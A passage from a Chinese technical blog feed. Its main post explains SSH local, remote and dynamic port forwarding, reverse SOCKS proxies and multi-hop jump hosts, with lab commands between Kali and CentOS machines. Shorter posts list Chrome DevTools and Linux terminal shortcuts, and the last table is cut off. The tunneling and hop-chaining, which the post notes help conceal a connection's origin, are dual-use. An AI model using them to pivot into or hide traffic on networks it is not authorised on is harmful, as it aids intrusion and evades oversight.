class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>翻译成人话，通俗讲就是，使用该参数执行 ssh 连接后，会在<strong>本机开启</strong>一个指定监听端口1，然后绑定到远程机器的指定接口（IP）的指定端口2，用另一个程序再访问本机的指定端口1，流量就会<strong>转发</strong>到远程机器的指定端口2，相当于直接访问远程机器的端口2；可以简单的理解为 “流量从<strong>本地转发</strong>到远程机器”。</p><p>参数值（<code>[bind_address:]port:host:hostport</code>）也有规律，从左到右写是本地到远程的顺序：本地地址（<code>bind_address]</code>）的端口（<code>port</code>）转发到远程地址（<code>host</code>）的端口（<code>hostport</code>），本地接口地址可省略，默认为 <code>127.0.0.1</code>。除了接口和端口也可以使用 <code>Unix socket</code> 建立连接，把对应的位置换成 socket 地址即可。</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>上面的转发流程有点绕，用实验来理解下实际效果，假设场景为 <strong>Kali</strong>（<code>192.168.111.128</code>）去连接 <strong>Centos</strong>（<code>192.168.111.131</code>）；那么首先确保 <strong>Centos</strong> 开启 22 端口，然后用 python 给它在 <code>8000</code> 端口开启一个简单的 <code>http</code> 服务：<br><img src="https://img-blog.csdnimg.cn/e5efe8b0f91b4fefac7532ae89b8bd01.png" alt="centos-http-server"></p><p>试着先本地访问下（<strong>Centos</strong> 具有第二个接口：<code>192.168.122.1</code>）：<br><img src="https://img-blog.csdnimg.cn/6904b332e0b04639986382d09006d30a.png" alt="centos-http-curl"></p><p>ok 没问题，接着去另一台机器 <strong>Kali</strong>（<code>192.168.111.128</code>） 上先测试连一下 <strong>Centos</strong> 的 ssh：<br><img src="https://img-blog.csdnimg.cn/d15e5d35cd414e6aad4a3fc366b281ec.png" alt="kali-ssh-centos"></p><p>证明连接是通的，接下来直接在 <strong>Kali</strong> 上使用本地转发连接 <strong>Centos</strong>（为了方便已提前给两台机器配置了 ssh 公钥连接，避免输入密码），执行参数为：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh -NL 1080:192.168.122.1:8000 root@192.168.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后执行后会在 <strong>Kali</strong> 本地监听 <code>1080</code>，再用 <code>curl</code> 访问一下这个端口，返回数据就是 <strong>Centos</strong> 的 <code>192.168.122.1</code> 接口上的 <code>8000</code> 端口所对应的内容：<br><img src="https://img-blog.csdnimg.cn/7da29b21bb0f42e68704fabb0138a7bd.png" alt="kali-local-curl-1080"></p><p>Centos 这边也记录到了相应的连接日志，本地转发<strong>成功</strong>：<br><img src="https://img-blog.csdnimg.cn/78863e76116d40659a599214162137da.png" alt="centos-http-log"></p><h2 id="远程转发（-R）"><a href="#远程转发（-R）" class="headerlink" title="远程转发（-R）"></a>远程转发（-R）</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>远程转发的执行参数是 <code>ssh -R</code>，官方的解释是：</p><pre class="line-numbers language-none"><code class="language-none">-R [bind_address:]port:host:hostport-R [bind_address:]port:local_socket-R remote_socket:host:hostport-R remote_socket:local_socket-R [bind_address:]port        Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be        forwarded to the local side.        This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.        Whenever a connection is made to this port or Unix socket, the connection is forwarded over the secure        channel, and a connection is made from the local machine to either an explicit destination specified by        host port hostport, or local_socket, or, if no explicit destination was specified, ssh will act as a        SOCKS 4&#x2F;5 proxy and forward connections to the destinations requested by the remote SOCKS client.        Port forwardings can also be specified in the configuration file.  Privileged ports can be forwarded        only when logging in as root on the remote machine.  IPv6 addresses can be specified by enclosing the        address in square brackets.        By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may        be overridden by specifying a bind_address.  An empty bind_address, or the address ‘*’, indicates that        the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed        if the server&#39;s GatewayPorts option is enabled (see sshd_config(5)).        If the port argument is ‘0’, the listen port will be dynamically allocated on the server and reported to        the client at run time.  When used together with -O forward, the allocated port will be printed to the        standard output.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通俗讲就是，执行远程转发命令后，会在<strong>远程机器开启</strong>监听一个指定端口1，绑定到本地的指定端口2，所有访问远程机器端口1 的流量都会被<strong>转发</strong>到本地的端口2 上，相当于直接访问本地的端口2，也可以简单的理解为 “流量从<strong>远程转发</strong>到本地机器”；</p><p>可以注意到这里的转发流向其实是和上面的<strong>本地转发</strong>是反的，所以参数值（<code>[bind_address:]port:host:hostport</code>）的规律也反了过来，从左到右写是：远程机器的接口（<code>[bind_address]</code>）上的端口（<code>port</code>）转发到本地接口（<code>host</code>）的端口（<code>hostport</code>）上去。远程接口地址（IP）可以省略，默认 <code>127.0.0.1</code>，<code>socket</code> 连接同理。</p><p>这里有个<strong>值得注意</strong>的地方，可以看到参数值那块，相比于前面的本地转发多了个 <code>[bind_address:]port</code> 值，也就是说同时省略了本地接口地址和端口值，远程接口也可按需省略，相当于可以只写一个远程端口值，这样其实会建立一个<strong>反向的 socks5 代理</strong>，即远程机器的那个端口可以被当成一个 <code>socks4</code> 或 <code>socks5</code> 代理端口，代理流量都会被引导至本地机器，这个后面也有对应实验验证。</p><h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p>下面同样使用 <strong>Kali</strong>（<code>192.168.111.128</code>）通过远程转发去连接 <strong>Centos</strong>（<code>192.168.111.131</code>），不过这次是在 <strong>Kali</strong> 上用 python 启一个简单的 <code>http</code> 服务：<br><img src="https://img-blog.csdnimg.cn/2d752bb9fe444d79aa58823a645126b1.png" alt="kali-http-and-curl"></p><p>本地连接没问题，接下来在 <strong>Kali</strong> 上开启远程转发，参数为：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh -NR 1080:127.0.0.1:8000 root@192.168.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2459194c35c640ebafc4d6bed96ad8c4.png" alt="kali-http-and-remote"></p><p>这会在远程机器（<strong>Centos</strong>, <code>192.168.111.131</code>）上开启一个新的监听端口 <code>1080</code>，再使用 <code>curl</code> 对其访问，就会得到 <strong>Kali</strong>（<code>192.168.111.128</code>）上端口 <code>8000</code> 的返回内容：<br><img src="https://img-blog.csdnimg.cn/e4d319fdbfb446b4915879c447024b0c.png" alt="centos-remote-1080"></p><p>Kali 这边也有了相应的访问记录，至此远程转发<strong>成功</strong>：<br><img src="https://img-blog.csdnimg.cn/54a9843f127b47509f19a0a89bb16b34.png" alt="kali-http-8000-log"></p><h4 id="反向-socks-代理"><a href="#反向-socks-代理" class="headerlink" title="反向 socks 代理"></a>反向 socks 代理</h4><p>然后测试 <code>-R</code> 参数值只指定一个远程端口的效果，前面讲这会让本地机器成为一台 <code>socks</code> 代理服务器，下面为了测试代理效果，就需要网关机器（<code>192.168.111.1</code>）上场了，在网关上启一个简单的 <code>php</code> 服务，以获取访问者的真实 IP 地址，代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问路径是：<code>http://192.168.111.1/get-ip.php</code>，先分别用 <strong>Kali</strong> 和 <strong>Centos</strong> 访问试下：<br><img src="https://img-blog.csdnimg.cn/a1c18d5416564710a603a9e942523172.png" alt="kali-get-ip"></p><p><img src="https://img-blog.csdnimg.cn/0c1080286e314d358dcb6584e1867365.png" alt="centos-get-ip"></p><p>ok，IP 是对的，然后在 <strong>Kali</strong>（<code>192.168.111.128</code>）上启动反向 socks 代理服务：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh -NR 1080 root@192.168.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/cc6020eaf4f14532a054751042db7f78.png" alt="kali-rev-socks"></p><p>去 <strong>Centos</strong>（<code>192.168.111.131</code>）上访问一下看看代理（使用 <code>curl</code> 的 <code>-x</code> 参数指定代理服务器）效果：<br><img src="https://img-blog.csdnimg.cn/90412805af2246bfbaf45611cccb629a.png" alt="centos-socks-curl"></p><p>至此反向 socks 代理<strong>成功</strong>。</p><h4 id="远程接口地址问题"><a href="#远程接口地址问题" class="headerlink" title="远程接口地址问题"></a>远程接口地址问题</h4><p>在实际使用远程转发的时候，可能会遇到一个<strong>小坑</strong>，就是 <code>-R</code> 的参数值虽然可以任意指定远程机器的接口地址，但实际上 ssh <strong>默认</strong>都只会在 <code>127.0.0.1</code> 接口地址上开监听端口，也就是说假如这台远程机器是台公网服务器的话，新监听的端口是没法在公网上访问到的，只能这台机器本地访问，这是一个 <code>sshd</code> 的<strong>默认配置</strong>导致的，它一般在 <code>/etc/ssh/sshd_config</code> 文件中，**<code>GatewayPorts</code>** 这个配置项，默认是 <code>no</code>，改成 <code>yes</code> 即可，如果没有这一行就手动添加：<br><img src="https://img-blog.csdnimg.cn/96b7ab65497347ccb8396a0c17da893f.png" alt="centos-sshd-gatewayports"></p><p>然后重启 <code>sshd</code> 服务，再用远程转发连接时就会在<strong>所有接口</strong>（即 <code>0.0.0.0</code>）上监听新端口了，但这样也<strong>只能</strong>在所有接口上开启端口了，无论连接方如何设置远程接口，所以需斟酌使用。<br><img src="https://img-blog.csdnimg.cn/75b3901f650a4673b1314743b0d53d9a.png" alt="centos-gatewayports-yes"></p><h2 id="动态转发（-D）"><a href="#动态转发（-D）" class="headerlink" title="动态转发（-D）"></a>动态转发（-D）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>动态转发的执行参数是 <code>ssh -D</code>，官方解释是：</p><pre class="line-numbers language-none"><code class="language-none">-D [bind_address:]port        Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to        listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection        is made to this port, the connection is forwarded over the secure channel, and the application protocol        is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5        protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.        Dynamic port forwardings can also be specified in the configuration file.        IPv6 addresses can be specified by enclosing the address in square brackets.  Only the superuser can        forward privileged ports.  By default, the local port is bound in accordance with the GatewayPorts set‐        ting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The        bind_address of “localhost” indicates that the listening port be bound for local use only, while an        empty address or ‘*’ indicates that the port should be available from all interfaces.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这应该是实际使用中较多的一种用途，即 socks 代理，动态转发是在<strong>本地</strong>监听一个指定端口，应用程序将 socks 代理端口设置为这个端口后，任何连接流量都会通过这个端口，经由 ssh 隧道转发到远程机器代为发送，由于不再受限于连接端和被连接端的端口与接口，所以称为<strong>动态</strong>。</p><p>参数值（<code>[bind_address:]port</code>）为要在本地机器监听的接口地址与端口，不写接口地址则默认为 <code>127.0.0.1</code>，在所有接口监听则写 <code>0.0.0.0</code>。</p><h3 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h3><p>还是在 <strong>Kali</strong>（<code>192.168.111.128</code>）上执行操作，监听本地 <code>1080</code> 端口，将 <strong>Centos</strong>（<code>192.168.111.131</code>）作为 socks 代理服务器：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh -ND 1080 root@192.168.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/17a5eb5e95694253baddbf2bf719acc3.png" alt="kali-dynamic-socks"></p><p>尝试用 <code>curl</code> 测试代理效果，可以看到 socks5 代理已生效，IP 地址为 <strong>Centos</strong>（<code>192.168.111.131</code>）的：<br><img src="https://img-blog.csdnimg.cn/1af48a1714f04ea0a293dc1e471493ef.png" alt="kali-dynamic-get-ip"></p><p><strong>Kali</strong> 访问 <strong>Centos</strong> 的其他接口（<code>192.168.122.1</code>）的 http 服务（<code>8000</code> 端口）也没问题：<br><img src="https://img-blog.csdnimg.cn/b9ebdbd78cd44dba91f383cf410b9acc.png" alt="kali-socks-centos-python"><br><img src="https://img-blog.csdnimg.cn/6bc83c262054402ea7a91186c4db5156.png" alt="centos-dynamic-socks-http-log"></p><h2 id="多级代理（-J）"><a href="#多级代理（-J）" class="headerlink" title="多级代理（-J）"></a>多级代理（-J）</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>实现多级代理需要用到 <code>ssh -J</code> 参数，即设置 <code>Jump host</code>，可理解为跳板，官方解释为：</p><pre class="line-numbers language-none"><code class="language-none">-J destination        Connect to the target host by first making a ssh connection to the jump host described by destination        and then establishing a TCP forwarding to the ultimate destination from there.  Multiple jump hops may        be specified separated by comma characters.  This is a shortcut to specify a ProxyJump configuration di‐        rective.  Note that configuration directives supplied on the command-line generally apply to the desti‐        nation host and not any specified jump hosts.  Use ~&#x2F;.ssh&#x2F;config to specify configuration for jump        hosts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大意就是连接 <code>ssh</code> 的过程中，可以指定（多个）<strong>跳板机</strong>，实现流量的一级一级转发，每一级跳板的系统都只有上一级的访问记录，达到一定的<strong>隐匿</strong>作用。参数值 <code>destination</code> 的语法与普通 <code>ssh</code> 连接对象的语法一致，指定多个跳板则将多个节点值以<strong>逗号</strong>分隔。</p><h3 id="实验-3"><a href="#实验-3" class="headerlink" title="实验"></a>实验</h3><p>为了呈现多级节点的效果，这里需再次用到网关机器（<code>192.168.111.1</code>），用其通过 <code>ssh</code> 连接 <strong>Centos</strong>（<code>192.168.111.131</code>），并以 <strong>Kali</strong>（<code>192.168.111.128</code>）作为跳板机，直接在网关上执行：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh root@192.168.111.131 -J root@192.168.111.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到最终连接到的 <strong>Centos</strong> 机器的访问记录是跳板机 <strong>Kali</strong> 的 IP 地址：<br><img src="https://img-blog.csdnimg.cn/b55b4aaa34604127903664110a7653eb.png" alt="gateway-jump-centos"></p><p>再测试一下指定多个跳板：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">ssh root@192.168.111.131 -J root@192.168.111.128,root@192.168.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/efb3b65892684e0b8e6b109b70e73a00.png" alt="gateway-multi-jump"></p><p>这里为了简化网络拓扑，所以把 Centos 自身也设置为一个跳板，那么经过的两个跳转节点就是 <code>.128</code> 和 <code>.131</code>，整个流量流转过程可以简化为：</p><pre class="line-numbers language-ssh" data-language="ssh"><code class="language-ssh">*.111.1  --&gt;  *.111.128  --&gt;  *.111.131  --&gt;  *.111.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 <code>-J</code> 参数与前面提到的几种转发与代理参数结合，就实现了<strong>多级代理</strong>功能。</p>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh socks 代理 多级代理 隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升开发效率的 Chrome 开发者工具快捷键参考</title>
      <link href="/2024/09/27/ruan-jian-gong-ju/ti-sheng-kai-fa-xiao-lu-de-chrome-kai-fa-zhe-gong-ju-kuai-jie-jian-can-kao/"/>
      <url>/2024/09/27/ruan-jian-gong-ju/ti-sheng-kai-fa-xiao-lu-de-chrome-kai-fa-zhe-gong-ju-kuai-jie-jian-can-kao/</url>
      
        <content type="html"><![CDATA[<p>本文只介绍 Chrome 一些主要和常用的快捷键，在其它浏览器的开发者工具中可类比，大部分快捷键作用都相同，只有个别差异。</p><h2 id="全局（所有面板）"><a href="#全局（所有面板）" class="headerlink" title="全局（所有面板）"></a>全局（所有面板）</h2><table><thead><tr><th>功能</th><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>打开开发者工具</td><td><code>F12</code> / <code>Ctrl + Shift + I</code></td><td>普通打开</td></tr><tr><td>打开 Console</td><td><code>Ctrl + Shift + J</code></td><td>打开工具并进入 Console 面板</td></tr><tr><td>检查元素</td><td><code>Ctrl + Shift + C</code></td><td>进入 Elements 面板后开始选取页面元素</td></tr><tr><td>开发者工具设置</td><td><code>?</code>/<code>F1</code></td><td>开发者工具的所有相关设置</td></tr><tr><td>切换上一个面板</td><td><code>Ctrl + [</code></td><td>向左切换一个面板</td></tr><tr><td>切换下一个面板</td><td><code>Ctrl + ]</code></td><td>向右切换一个面板</td></tr><tr><td>切换工具停靠位置</td><td><code>Ctrl + Shift + D</code></td><td>即整个工具相对于浏览器的停靠位置，具体在悬浮、左侧、右侧、底部哪两个间切换，取决于最近两次操作</td></tr><tr><td>切换设备模式</td><td><code>Ctrl + Shift + M</code></td><td>普通模式和响应式设备编辑模式间切换</td></tr><tr><td>切换抽屉工具栏</td><td><code>Esc</code></td><td>切换显示工具底部的弹出式工具栏，如 Console 等</td></tr><tr><td>刷新网页</td><td><code>F5</code>/<code>Ctrl + R</code></td><td>普通刷新页面，会读取 memory cache 和 disk cache</td></tr><tr><td>强制刷新</td><td><code>Ctrl + F5</code>/<code>Ctrl + Shift + R</code></td><td>禁用缓存刷新，类似于勾选 <code>disable cache</code> 后刷新</td></tr><tr><td>当前面板中搜索</td><td><code>Ctrl + F</code></td><td>当前面板中搜索文本，如 Elements, Console 等</td></tr><tr><td>所有资源中搜索</td><td><code>Ctrl + Shift + F</code></td><td>在当前网页加载的所有资源（Sources）中搜索文本</td></tr><tr><td>按文件名搜索</td><td><code>Ctrl + O</code>/<code>Ctrl + P</code></td><td>同样搜索所有资源，只是搜索对象限制在文件名称上</td></tr><tr><td>放大字体</td><td><code>Ctrl + +</code></td><td>放大整个开发者工具的字体与图形（不包括网页）</td></tr><tr><td>缩小字体</td><td><code>Ctrl + -</code></td><td>缩小开发者工具字体与图形的尺寸</td></tr><tr><td>恢复字体大小</td><td><code>Ctrl + 0</code></td><td>将开发者工具的字体与图形尺寸恢复默认大小</td></tr></tbody></table><h2 id="Elements（元素）面板"><a href="#Elements（元素）面板" class="headerlink" title="Elements（元素）面板"></a>Elements（元素）面板</h2><table><thead><tr><th>功能</th><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>撤消更改</td><td><code>Ctrl + Z</code></td><td>撤销对 HTML 内容的修改</td></tr><tr><td>重做更改</td><td><code>Ctrl + Y</code></td><td>恢复撤销前的修改</td></tr><tr><td>展开节点</td><td><code>→</code>（右方向键）</td><td>展开当前折叠的 HTML 元素节点</td></tr><tr><td>折叠节点</td><td><code>←</code>（左方向键）</td><td>折叠当前展开的 HTML 元素节点</td></tr><tr><td>递归展开节点</td><td><code>Alt + →</code></td><td>递归地展开当前折叠的 HTML 元素节点</td></tr><tr><td>递归折叠节点</td><td><code>Alt + ←</code></td><td>递归地折叠当前展开的 HTML 元素节点</td></tr><tr><td>编辑节点属性</td><td><code>Enter</code></td><td>编辑所在元素节点的属性值（第一个属性的）</td></tr><tr><td>编辑下个属性</td><td><code>Tab</code></td><td>按下 Enter 编辑属性后，按 Tab 可以依次切换到后面的属性</td></tr><tr><td>编辑上个属性</td><td><code>Shift + Tab</code></td><td>切换到当前元素节点的上一个属性值进行编辑</td></tr><tr><td>隐藏节点</td><td><code>H</code></td><td>在页面中隐藏当前元素节点，实质是设置 <code>visibility: hidden !important;</code> 样式</td></tr><tr><td>编辑 HTML</td><td><code>F2</code></td><td>以 HTML 的形式编辑当前元素节点内容，类似于右键菜单的 <code>Edit as HTML</code></td></tr><tr><td>编辑源样式</td><td><code>Ctrl + 点击</code></td><td>Style（样式）栏中，Ctrl + 鼠标点击 CSS 规则（选择器、属性或属性值）时，会跳转到源文件的相应位置</td></tr><tr><td>切换颜色类型</td><td><code>Shift + 点击</code></td><td>Shift + 点击样式颜色值左边的取色框时，色值类型会在 <code>#, rgb(), hls()</code> 之间切换</td></tr><tr><td>增/减数值</td><td><code>↑</code>/<code>↓</code>（上、下方向键）</td><td>单次增/减大小为 1 单位</td></tr><tr><td>0.1 倍增/减值</td><td><code>Alt + ↑</code>/<code>Alt + ↓</code></td><td>单次增/减 0.1 倍单位值</td></tr><tr><td>10 倍增/减值</td><td><code>Shift + ↑</code>/<code>Shift + ↓</code></td><td>单次增/减 10 倍单位值</td></tr><tr><td>100 倍增/减值</td><td><code>Ctrl + ↑</code>/<code>Ctrl + ↓</code></td><td>单次增/减 100 倍单位值</td></tr></tbody></table><h2 id="Console（控制台）面板"><a href="#Console（控制台）面板" class="headerlink" title="Console（控制台）面板"></a>Console（控制台）面板</h2><table><thead><tr><th>功能</th><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>清空输出</td><td><code>Ctrl + L</code></td><td>清空控制台的历史输出</td></tr><tr><td>聚焦输入</td><td><code>Ctrl + ` </code>（反引号）</td><td>把输入焦点聚焦到控制台输入框中，其它面板中使用则打开 Console 抽屉栏</td></tr><tr><td>接受建议</td><td><code>Enter</code>/<code>→</code></td><td>接受代码提示的第一个建议项</td></tr><tr><td>切换命令</td><td><code>↑</code>/<code>↓</code></td><td>切换上/下一条历史输入命令</td></tr><tr><td>运行代码</td><td><code>Enter</code></td><td>回车运行输入的代码</td></tr><tr><td>换行输入</td><td><code>Shift + Enter</code></td><td>由于直接回车是运行代码，所以想换行输入需要加 Shift</td></tr></tbody></table><h2 id="Sources（资源）面板"><a href="#Sources（资源）面板" class="headerlink" title="Sources（资源）面板"></a>Sources（资源）面板</h2><table><thead><tr><th>功能</th><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>执行脚本</td><td><code>F8</code>/<code>Ctrl + \</code></td><td>切换执行或暂停脚本</td></tr><tr><td>单步执行</td><td><code>F10</code>/<code>Ctrl + &#39;</code></td><td>（Debugger 栏中 ）单步调试脚本</td></tr><tr><td>单步进入</td><td><code>F11</code>/<code>Ctrl + ;</code></td><td>单步进入调试（遇到函数就跳入）</td></tr><tr><td>单步跳出</td><td><code>Shift + F11</code>/<code>Ctrl + Shift + ;</code></td><td>单步跳出调试（跳出当前函数）</td></tr><tr><td>下个调用帧</td><td><code>Ctrl + .</code>（英文句号）</td><td>调试时切换到调用栈（Call Stack 栏）中当前帧的下面一帧</td></tr><tr><td>上个调用帧</td><td><code>Ctrl + ,</code>（英文逗号）</td><td>调试时切换到当前调用的帧上面一帧（当前为栈顶则忽略）</td></tr><tr><td>输出变量值</td><td><code>Ctrl + Shift + E</code></td><td>在控制台输出编辑器中所选中的变量的值</td></tr><tr><td>观察变量值</td><td><code>Ctrl + Shift + A</code></td><td>将编辑器中选中的变量值添加到 Watch 栏中</td></tr><tr><td>切换断点</td><td><code>Ctrl + B</code></td><td>当焦点位于代码编辑器中时，用于切换当前行是否设置为断点</td></tr><tr><td>切换启用断点</td><td><code>Ctrl + Shift + B</code></td><td>切换当前行的断点是否启用（不会删除断点）</td></tr><tr><td>切换启用全部断点</td><td><code>Ctrl + F8</code></td><td>切换所有设置的断点是否启用</td></tr><tr><td>编辑断点</td><td><code>Ctrl + Alt + B</code></td><td>编辑当前行的断点类型（Breakpoint, Conditional Breakpoint, Logpoint）</td></tr></tbody></table><h2 id="代码编辑器（Sources-面板中）"><a href="#代码编辑器（Sources-面板中）" class="headerlink" title="代码编辑器（Sources 面板中）"></a>代码编辑器（Sources 面板中）</h2><table><thead><tr><th>功能</th><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td>切换注释</td><td><code>Ctrl + /</code></td><td>为当前行或选中内容添加/取消注释</td></tr><tr><td>保存修改</td><td><code>Ctrl + S</code></td><td>保存对文件的修改（需要先启用侧栏的 Overrides 功能）</td></tr><tr><td>保存所有更改</td><td><code>Ctrl + Alt + S</code></td><td>保存编辑器打开的所有文件，同样需要启用 Overrides</td></tr><tr><td>转到匹配括号</td><td><code>Ctrl + M</code></td><td>跳转到与当前光标位置的括号匹配的另一个括号处</td></tr><tr><td>添加匹配项</td><td><code>Ctrl + D</code></td><td>跳转并添加选择下一个与选择文本匹配的文本</td></tr><tr><td>撤销匹配项</td><td><code>Ctrl + U</code></td><td>返回并撤销选择一个匹配项，与 <code>Ctrl + D</code> 相反</td></tr><tr><td>转到行</td><td><code>Ctrl + G</code></td><td>跳转到指定行数</td></tr><tr><td>转到成员</td><td><code>Ctrl + Shift + O</code></td><td>跳转到当前文件中的指定成员函数</td></tr><tr><td>上个编辑处</td><td><code>Alt + -</code></td><td>跳转到上一个光标位于的编辑位置</td></tr><tr><td>下个编辑处</td><td><code>Alt + +</code></td><td>跳转到下一个编辑位置</td></tr><tr><td>关闭活动标签</td><td><code>Alt + W</code></td><td>关闭当前编辑的标签（文件）</td></tr><tr><td>增/减CSS值</td><td><code>Alt + ↑</code>/<code>Alt +↓</code></td><td>编辑 CSS 源文件时，可对当前数值增/减 1 一个单位</td></tr><tr><td>10 倍增/减CSS值</td><td><code>Alt + PageUp↑</code>/<code>Alt + PageDown</code></td><td>CSS 中对当前数值增/减 10 一个单位</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chrome devtool 开发者工具 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升 Linux 终端命令敲写效率的快捷键参考</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/ti-sheng-linux-zhong-duan-ming-ling-qiao-xie-xiao-lu-de-kuai-jie-jian-can-kao/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/ti-sheng-linux-zhong-duan-ming-ling-qiao-xie-xiao-lu-de-kuai-jie-jian-can-kao/</url>
      
        <content type="html"><![CDATA[<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + B</code></td><td>光标向前移动一个字符（Backward）</td></tr><tr><td><code>Ctrl + F</code></td><td>向后移动一个字符（Forward）</td></tr><tr><td><code>Alt + B</code>/<code>Ctrl + →</code></td><td>向前移动一个单词</td></tr><tr><td><code>Alt + F</code>/<code>Ctrl + ←</code></td><td>向后移动一个单词</td></tr><tr><td><code>Ctrl + A</code>/<code>Home</code></td><td>移动到行首（Ahead）</td></tr><tr><td><code>Ctrl + E</code>/<code>End</code></td><td>移到行尾（End）</td></tr><tr><td><code>Ctrl + XX</code></td><td>行首与当前光标之间切换位置（方便在两处修改）</td></tr><tr><td><code>Ctrl + T</code></td><td>交换光标处与左边一个字符位置（Transform）</td></tr><tr><td><code>Alt + T</code></td><td>交换光标处和左边一个单词位置</td></tr></tbody></table><h2 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + L</code></td><td>清屏（不包含输入为运行的命令）</td></tr><tr><td><code>Ctrl + Shift + C</code></td><td>复制（到系统粘贴板）</td></tr><tr><td><code>Ctrl + Shift + V</code></td><td>粘贴（来自系统粘贴板）</td></tr><tr><td><code>Alt + .</code></td><td>粘帖上次命令的最后一个参数</td></tr><tr><td><code>Ctrl + H</code>/<code>Backspace</code></td><td>向左删除一个字符</td></tr><tr><td><code>Ctrl + D</code>/<code>Del</code></td><td>向右删除一个字符（Delete）</td></tr><tr><td><code>Ctrl + W</code>/<code>Alt + Backspace</code></td><td>向左剪切一个单词（到终端粘贴板）</td></tr><tr><td><code>Ctrl + Del</code>/<code>Alt + D</code></td><td>向右剪切一个单词</td></tr><tr><td><code>Ctrl + U</code></td><td>剪切光标左边所有内容（不含光标处）</td></tr><tr><td><code>Ctrl + K</code></td><td>剪切光标处以及右边所有内容</td></tr><tr><td><code>Ctrl + Y</code></td><td>粘贴（来自终端粘贴板）</td></tr><tr><td><code>Alt + Y</code></td><td>粘贴（按下 Ctrl+Y 后，由新到旧选择历史剪切内容粘贴）</td></tr><tr><td><code>Alt + C</code></td><td>光标处往后一个单词首字母大写（capital）</td></tr><tr><td><code>Alt + U</code></td><td>光标处往后一个单词字母全大写（Upper case）</td></tr><tr><td><code>Alt + L</code></td><td>光标处往后一个单词字母全小写（Lower case）</td></tr></tbody></table><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><table><thead><tr><th>快捷键</th><th>描述</th></tr></thead><tbody><tr><td><code>Ctrl + M</code>/<code>Ctrl + O</code></td><td>运行命令（类似 <code>Enter</code> 键）</td></tr><tr><td><code>Ctrl + C</code></td><td>终止命令（未执行的输入命令会清除，已运行则中止进程）</td></tr><tr><td><code>Ctrl + D</code></td><td>退出终端（无未执行命令时）</td></tr><tr><td><code>Ctrl + Z</code></td><td>挂起命令（切换到后台继续执行）</td></tr><tr><td><code>Ctrl + S</code></td><td>阻止屏幕输出（当前在运行持续输出的命令时，如 watch 命令）</td></tr><tr><td><code>Ctrl + 